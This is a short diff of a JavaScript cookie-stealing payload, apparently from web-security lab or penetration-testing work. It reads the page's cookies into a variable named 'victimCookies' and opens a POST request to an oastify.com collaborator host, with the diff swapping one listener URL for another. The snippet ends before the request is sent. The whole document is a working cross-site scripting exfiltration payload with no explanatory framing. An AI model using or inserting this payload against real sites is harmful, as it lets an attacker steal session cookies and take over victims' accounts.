@@ -1,6 +1,6 @@
 var victimCookies=document.cookie
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://lg5zdbxfk0nhj8403lxvlzymgdm4auyj.oastify.com", true);
+xhr.open("POST", "https://kk8yw4pi2aq36xt6253wu8d4dvjm7cv1.oastify.com", true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 xhr.onreadystatechange = function() {
